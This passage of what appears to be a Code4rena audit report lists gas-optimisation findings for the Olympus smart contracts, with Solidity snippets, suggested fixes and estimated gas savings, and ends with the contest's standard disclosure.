Permissions(MINTR_KEYCODE, lmintr.burnOhm.selector);\n```\n\n*   src/policies/Governance.sol:[77-79](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L77-L79)\n\n```solidity\n77         requests = new Permissions[](2);\n78         requests[0] = Permissions(INSTR.KEYCODE(), INSTR.store.selector);\n79         requests[1] = Permissions(VOTES.KEYCODE(), VOTES.transferFrom.selector);\n```\n\n*   src/policies/Operator.sol:[172-185](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L172-L185)\n\n```solidity\n172        Keycode RANGE_KEYCODE = RANGE.KEYCODE();\n173        Keycode TRSRY_KEYCODE = TRSRY.KEYCODE();\n174        Keycode MINTR_KEYCODE = MINTR.KEYCODE();\n175\n176        requests = new Permissions[](9);\n177        requests[0] = Permissions(RANGE_KEYCODE, RANGE.updateCapacity.selector);\n178        requests[1] = Permissions(RANGE_KEYCODE, RANGE.updateMarket.selector);\n179        requests[2] = Permissions(RANGE_KEYCODE, RANGE.updatePrices.selector);\n180        requests[3] = Permissions(RANGE_KEYCODE, RANGE.regenerate.selector);\n181        requests[4] = Permissions(RANGE_KEYCODE, RANGE.setSpreads.selector);\n182        requests[5] = Permissions(RANGE_KEYCODE, RANGE.setThresholdFactor.selector);\n183        requests[6] = Permissions(TRSRY_KEYCODE, TRSRY.setApprovalFor.selector);\n184        requests[7] = Permissions(MINTR_KEYCODE, MINTR.mintOhm.selector);\n185        requests[8] = Permissions(MINTR_KEYCODE, MINTR.burnOhm.selector);\n```\n\n*   src/policies/PriceConfig.sol:[32-34](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/PriceConfig.sol#L32-L34)\n\n```solidity\n32        permissions[0] = Permissions(PRICE.KEYCODE(), PRICE.initialize.selector);\n33        permissions[1] = Permissions(PRICE.KEYCODE(), PRICE.changeMovingAverageDuration.selector);\n34        permissions[2] = Permissions(PRICE.KEYCODE(), PRICE.changeObservationFrequency.selector);\n```\n\n*   src/policies/TreasuryCustodian.sol:[35-39](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/TreasuryCustodian.sol#L35-L39)\n\n```solidity\n35        Keycode TRSRY_KEYCODE = TRSRY.KEYCODE();\n36\n37        requests = new Permissions[](2);\n38        requests[0] = Permissions(TRSRY_KEYCODE, TRSRY.setApprovalFor.selector);\n39        requests[1] = Permissions(TRSRY_KEYCODE, TRSRY.setDebt.selector);\n```\n\n*   src/policies/VoterRegistration.sol:[33-35](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/VoterRegistration.sol#L34-L35)\n\n```solidity\n33        permissions = new Permissions[](2);\n34        permissions[0] = Permissions(VOTES.KEYCODE(), VOTES.mintTo.selector);\n35        permissions[1] = Permissions(VOTES.KEYCODE(), VOTES.burnFrom.selector);\n```\n\n## [G-06]  Using bools for storage incurs overhead (6 instances)\n\nDeployment Gas Saved: **23 611**<br>\nMethod Call Gas Saved: **4 485**<br>\n\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n\nUse uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas) for the extra SLOAD, and to avoid Gsset (20000 gas) when changing from 'false' to 'true', after having been 'true' in the past.\n\n**Important**: This rule doesn't always work, sometimes a bool is packed with another variable in the same slot, sometimes it's packed into a struct, sometimes the optimizer makes bool more efficient. You can see the @note in the code for each case.\n\n*   src/Kernel.sol:[181](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L181), [194](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L194), [197](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L197)\n\n```solidity\n181    mapping(Keycode => mapping(Policy => mapping(bytes4 => bool))) public modulePermissions; //@note D:3200 M:1754\n...\n194    mapping(address => mapping(Role => bool)) public hasRole; //@note D:−3016 M:2298\n...\n197    mapping(Role => bool) public isRole; //@note D:2407\n```\n\n*   src/policies/Governance.sol:[105](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L105), [117](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L117),\n\n```solidity\n105    mapping(uint256 => bool) public proposalHasBeenActivated; //@note D:3007\n...\n117    mapping(uint256 => mapping(address => bool)) public tokenClaimsForProposal; //@note D:3007\n```\n\n*   src/modules/PRICE.sol:[62](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L62)\n\n```solidity\n62     bool public initialized; //@note D:11813\n```\n\n**Expensive method calls**:\n\nIt's just to show which bool is better left in the code\n\n*   src/policies/Operator.sol\n\n```solidity\n63     bool public initialized; //@note D:5808 M:-22036\n...\n66     bool public active; //@note D:-32775 M:-48896\n```\n\n*   src/policies/Heart.sol\n\n```solidity\n33     bool public active; //@note D:-382\n```\n\n*   src/policies/BondCallback.sol\n\n```solidity\n24     mapping(address => mapping(uint256 => bool)) public approvedMarkets; //@note D:-44192\n```\n\n*   src/Kernel.sol\n\n```solidity\n113    bool public isActive; //@note D:20923 M:-247184\n```\n\n## [G-07] State variables can be packed into fewer storage slots (3 instances)\n\nIf variables occupying the same slot are both written the same function or by the constructor, avoids a separate Gsset (20000 gas). Reads of the variables can also be cheaper.\n\n**NOTE**: one slot = 32 bytes\n\nDeployment Gas Saved: **23 292**<br>\nMethod Call Gas Saved: **1 711**<br>\n\n*   src/policies/Heart.sol:[32-48](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L32-L48)\n\nuint256(32), address(20), bool(1)\n\n```solidity\n32     /// @notice Status of the Heart, false = stopped, true = beating\n33     bool public active; // @note put below _operator\n34\n35     /// @notice Timestamp of the last beat (UTC, in seconds)\n36     uint256 public lastBeat;\n37\n38     /// @notice Reward for beating the Heart (in reward token decimals)\n39     uint256 public reward;\n40\n41     /// @notice Reward token address that users are sent for beating the Heart\n42     ERC20 public rewardToken;\n43\n44     // Modules\n45     OlympusPrice internal PRICE;\n46\n47     // Policies\n48     IOperator internal _operator;\n```\n\nfix:\n\n```solidity\nuint256 public lastBeat;\nuint256 public reward;\nERC20 public rewardToken;\nOlympusPrice internal PRICE;\nIOperator internal _operator;\nbool public active;\n```\n\n*   src/modules/PRICE.sol:[31-65](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L31-L65)\n\n**NOTE**: PRICE is Module, Module is KernelAdapter, so real first variable in PRICE is kernel from KernelAdapter\n\nuint256(32), uint32(4), uint48(6), uint8(1), array(32), address(20), bool(1)\n\n```solidity\ninherit Kernel public kernel;\n...\n31     /// @dev    Price feeds. Chainlink typically provides price feeds for an asset in ETH. Therefore, we use two price feeds against ETH, one for OHM and one for the Reserve asset, to calculate the relative price of OHM in the Reserve asset.\n32     AggregatorV2V3Interface internal immutable _ohmEthPriceFeed;\n33     AggregatorV2V3Interface internal immutable _reserveEthPriceFeed;\n34\n35     /// @dev Moving average data\n36     uint256 internal _movingAverage; /// See getMovingAverage()\n37\n38     /// @notice Array of price observations. Check nextObsIndex to determine latest data point.\n39     /// @dev    Observations are stored in a ring buffer where the moving average is the sum of all observations divided by the number of observations.\n40     ///         Observations can be cleared by changing the movingAverageDuration or observationFrequency and must be re-initialized.\n41     uint256[] public observations;\n42\n43     /// @notice Index of the next observation to make. The current value at this index is the oldest observation.\n44     uint32 public nextObsIndex;\n45\n46     /// @notice Number of observations used in the moving average calculation. Computed from movingAverageDuration / observationFrequency.\n47     uint32 public numObservations;\n48\n49     /// @notice Frequency (in seconds) that observations should be stored.\n50     uint48 public observationFrequency;\n51\n52     /// @notice Duration (in seconds) over which the moving average is calculated.\n53     uint48 public movingAverageDuration;\n54\n55     /// @notice Unix timestamp of last observation (in seconds).\n56     uint48 public lastObservationTime;\n57\n58     /// @notice Number of decimals in the price values provided by the contract.\n59     uint8 public constant decimals = 18;\n60\n61     /// @notice Whether the price module is initialized (and therefore active).\n62     bool public initialized;\n63\n64     // Scale factor for converting prices, calculated from decimal values.\n65     uint256 internal immutable _scaleFactor;\n```\n\nfix:\n\n```solidity\nuint48 public observationFrequency;\nuint48 public movingAverageDuration;\nAggregatorV2V3Interface internal immutable _ohmEthPriceFeed;\nAggregatorV2V3Interface internal immutable _reserveEthPriceFeed;\nuint256 internal _movingAverage; /// See getMovingAverage()\nuint256[] public observations;\nuint32 public nextObsIndex;\nuint32 public numObservations;\nuint48 public lastObservationTime;\nuint8 public constant decimals = 18;\nbool public initialized;\nuint256 internal immutable _scaleFactor;\n```\n\n*   src/policies/Operator.sol:[58-89](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L58-L89)\n\nuint32(4), uint8(1), address(20), bool(1)\n\n```solidity\n58     /// Operator variables, defined in the interface on the external getter functions\n59     Status internal _status;\n60     Config internal _config;\n61\n62     /// @notice    Whether the Operator has been initialized\n63     bool public initialized;\n64\n65     /// @notice    Whether the Operator is active\n66     bool public active;\n67\n68     /// Modules\n69     OlympusPrice internal PRICE;\n70     OlympusRange internal RANGE;\n71     OlympusTreasury internal TRSRY;\n72     OlympusMinter internal MINTR;\n73\n74     /// External contracts\n75     /// @notice     Auctioneer contract used for cushion bond market deployments\n76     IBondAuctioneer public auctioneer;\n77     /// @notice     Callback contract used for cushion bond market payouts\n78     IBondCallback public callback;\n79\n80     /// Tokens\n81     /// @notice     OHM token contract\n82     ERC20 public immutable ohm;\n83     uint8 public immutable ohmDecimals;\n84     /// @notice     Reserve token contract\n85     ERC20 public immutable reserve;\n86     uint8 public immutable reserveDecimals;\n87\n88     /// Constants\n89     uint32 public constant FACTOR_SCALE = 1e4;\n```\n\nfix:\n\n```solidity\nStatus internal _status;\nConfig internal _config;\nOlympusPrice internal PRICE;\nOlympusRange internal RANGE;\nOlympusTreasury internal TRSRY;\nOlympusMinter internal MINTR;\nIBondAuctioneer public auctioneer;\nIBondCallback public callback;\nbool public initialized;\nbool public active;\nERC20 public immutable ohm;\nuint8 public immutable ohmDecimals;\nERC20 public immutable reserve;\nuint8 public immutable reserveDecimals;\nuint32 public constant FACTOR_SCALE = 1e4;\n```\n\n## [G-08] Expressions that cannot be overflowed can be unchecked (5 instances)\n\nDeployment Gas Saved: **23 016**\n\n*   src/Kernel.sol:[299-300](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L299-L300), [309-310](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L309-L310)\n\n```solidity\n299        activePolicies.push(policy_);\n300        getPolicyIndex[policy_] = activePolicies.length - 1; // @note cannot be overflowed due to a previous push\n...\n309            moduleDependents[keycode].push(policy_);\n310            getDependentIndex[keycode][policy_] = moduleDependents[keycode].length - 1; // @note cannot be overflowed due to a previous push\n```\n\n*   src/modules/PRICE.sol:[89](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L89), [144](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L144), [171](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L171)\n\n```solidity\n89         uint256 exponent = decimals + reserveEthDecimals - ohmEthDecimals; //@note overflow is not possible, if an underflow occurs, the next statement will revert\n...\n144        nextObsIndex = (nextObsIndex + 1) % numObs; //@note numObs can not be equal 0 during to check in constructor\n...\n171            if (updatedAt < block.timestamp - uint256(observationFrequency)) // @note can not be underflowed due to ` - 3 * uint256(observationFrequency)` in 165\n```\n\n## [G-09] Increment optimization (18 instances)\n\nFor a uint256 i variable, the following is true with the Optimizer enabled at 10k:\n\nIncrement:\n\ni += 1 is the most expensive form<br>\ni++ costs 6 gas less than i += 1<br>\n\\++i costs 5 gas less than i++ (11 gas less than i += 1)<br>\n\nDecrement:\n\ni -= 1 is the most expensive form<br>\ni-- costs 11 gas less than i -= 1<br>\n\\--i costs 5 gas less than i-- (16 gas less than i -= 1)<br>\n\n### [G-09.1]  Prefix increments are cheaper than postfix increments, especially when it's used in for-loops (3 instances).\n\nDeployment Gas Saved: **400**\n\n*   src/utils/KernelUtils.sol:[49](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L49), [64](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L64)\n\n```solidity\n49            i++;\n...\n64            i++;\n```\n\n*   src/policies/Operator.sol:[488](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L488)\n\nNOTE: in case of 670 675 686 691 not applicable and gas will be lost\n\n```solidity\n488            decimals++;\n```\n\n### [G-09.2] `<x> = <x> + 1` even more efficient than pre increment.(18 instances)\n\nDeployment Gas Saved: **14 217**\n\n*   src/utils/KernelUtils.sol:[49](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L49), [64](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L64)\n\n```solidity\n49            i++;\n...\n64            i++;\n```\n\n*   src/policies/Operator.sol:[488](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L488), [670](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L670), [675](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L675), [686](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L686), [691](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L691)\n*\n\n```solidity\n488            decimals++;\n...\n670                _status.low.count++;\n...\n675                _status.low.count--;\n...\n686                _status.high.count++;\n...\n691                _status.high.count--;\n```\n\n*   src/Kernel.sol:[313](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L313), [357](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L357), [369](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L369), [386](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L386), [404](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L404), [429](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L429)\n\n```solidity\n313                ++i;\n...\n357                ++i;\n...\n369                ++j;\n...\n386                ++i;\n...\n404                ++i;\n...\n429                ++i;\n```\n\n*   src/modules/INSTR.sol:[72](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L72)\n\n```solidity\n72                ++i;\n```\n\n*   src/modules/PRICE.sol:[225](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L225)\n\n```solidity\n225                ++i;\n```\n\n*   src/policies/BondCallback.sol:[163](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L163)\n\n```solidity\n163                ++i;\n```\n\n*   src/policies/Governance.sol:[281](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L281)\n\n```solidity\n281                ++step;\n```\n\n*   src/policies/TreasuryCustodian.sol:[62](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/TreasuryCustodian.sol#L62)\n\n```solidity\n62                ++j;\n```\n\n## [G-10] Use named `returns` for local variables where it is possible (3 instances)\n\nDeployment Gas Saved: **5 400**\n\n*   src/Kernel.sol:[130-135](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L130-L135)\n\n```solidity\n130    /// @notice Function to grab module address from a given keycode.\n131    function getModuleAddress(Keycode keycode_) internal view returns (address) {\n132        address moduleForKeycode = address(kernel.getModuleForKeycode(keycode_));\n133        if (moduleForKeycode == address(0)) revert Policy_ModuleDoesNotExist(keycode_);\n134        return moduleForKeycode;\n135    }\n```\n\nfix:\n\n```solidity\n    function getModuleAddress(Keycode keycode_) internal view returns (address moduleForKeycode) {\n        moduleForKeycode = address(kernel.getModuleForKeycode(keycode_));\n        if (moduleForKeycode == address(0)) revert Policy_ModuleDoesNotExist(keycode_);\n    }\n```\n\n*   src/modules/INSTR.sol:[41-79](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L41-L79)\n\n```solidity\n41    /// @notice Store a list of Instructions to be executed in the future.\n42    function store(Instruction[] calldata instructions_) external permissioned returns (uint256) {\n43        uint256 length = instructions_.length;\n44        uint256 instructionsId = ++totalInstructions;\n45\n46        Instruction[] storage instructions = storedInstructions[instructionsId];\n...\n76        emit InstructionsStored(instructionsId);\n77\n78        return instructionsId;\n79    }\n```\n\n*   src/modules/PRICE.sol:[153-180](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L153-L180)\n\n```solidity\n153    /// @notice Get the current price of OHM in the Reserve asset from the price feeds\n154    function getCurrentPrice() public view returns (uint256) {\n...\n177        uint256 currentPrice = (ohmEthPrice * _scaleFactor) / reserveEthPrice;\n178\n179        return currentPrice;\n180    }\n```\n\n## [G-11] `x = x + y` is cheaper than `x += y;` (6 instances)\n\nDeployment Gas Saved: **5 000**\n\nUsually does not work with struct and mappings.\n\n*   src/modules/PRICE.sol:[136](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L136), [138](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L138), [222](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L222)\n\n```solidity\n136            _movingAverage += (currentPrice - earliestPrice) / numObs;\n...\n138            _movingAverage -= (earliestPrice - currentPrice) / numObs;\n...\n222            total += startObservations_[i];\n```\n\n*   src/modules/VOTES.sol:[56](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L56), [58](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L58)\n\n```solidity\n56        balanceOf[from_] -= amount_;\n...\n58            balanceOf[to_] += amount_;\n```\n\n*   src/policies/Heart.sol:[103](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Heart.sol#L103)\n\n```solidity\n103        lastBeat += frequency();\n```\n\n## [G-12] Deleting a struct is cheaper than creating a new struct with null values. (1 instances)\n\nDeployment Gas Saved: **4 207**<br>\nMethod Call Gas Saved: **40**<br>\n\n*   src/policies/Governance.sol:[288](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L288)\n\n```solidity\n288        activeProposal = ActivatedProposal(0, 0);\n```\n\nfix:\n\n```solidity\n    delete activeProposal;\n```\n\n## [G-13] Don't compare boolean expressions to boolean literals (2 instances)\n\nDeployment Gas Saved: **1 607**\n\n*   src/policies/Governance.sol:[223](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L223), [306](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L306)\n\n```solidity\n223        if (proposalHasBeenActivated[proposalId_] == true) {\n...\n306        if (tokenClaimsForProposal[proposalId_][msg.sender] == true) {\n```\n\n## [G-14] `revert` operator should be in the code as early as reasonably possible (3 instances)\n\nDeployment Gas Saved: **200**<br>\nMethod Call Gas Saved: **1 559+**<br>\n\n*   src/modules/INSTR.sol:[43-48](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L43-L48)\n\n```solidity\n43        uint256 length = instructions_.length;\n44        uint256 instructionsId = ++totalInstructions;\n45\n46        Instruction[] storage instructions = storedInstructions[instructionsId];\n47\n48        if (length == 0) revert INSTR_InstructionsCannotBeEmpty(); // @note after 43\n```\n\n*   src/policies/Governance.sol:[180-191](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L180-L191), [241-249](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L241-L249)\n\n```solidity\n180    function endorseProposal(uint256 proposalId_) external {\n181        uint256 userVotes = VOTES.balanceOf(msg.sender); // @note put after revert\n182\n183        if (proposalId_ == 0) {\n184            revert CannotEndorseNullProposal();\n185        }\n186\n187        Instruction[] memory instructions = INSTR.getInstructions(proposalId_);\n188        if (instructions.length == 0) {\n189            revert CannotEndorseInvalidProposal();\n190        }\n191\n```\n\n```solidity\n241        uint256 userVotes = VOTES.balanceOf(msg.sender); // @note put after revert\n242\n243        if (activeProposal.proposalId == 0) {\n244            revert NoActiveProposalDetected();\n245        }\n246\n247        if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {\n248            revert UserAlreadyVoted();\n249        }\n```\n\n## [G-15] Duplicated require()/revert() checks should be refactored to a modifier or function\n\nMethod Call Gas Saved: **8 111**\n\n*   [src/modules/PRICE.sol](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol)\n\n```solidity\nif (!initialized) revert Price_NotInitialized(); // @note 4 instances\n```\n\n**[0xLienid (Olympus) confirmed](https://github.com/code-423n4/2022-08-olympus-findings/issues/39)**\n\n\n\n***\n\n# Disclosures\n\nC4 is an open organization governed by participants in the community.\n\nC4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.\n\nC4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.\n"
}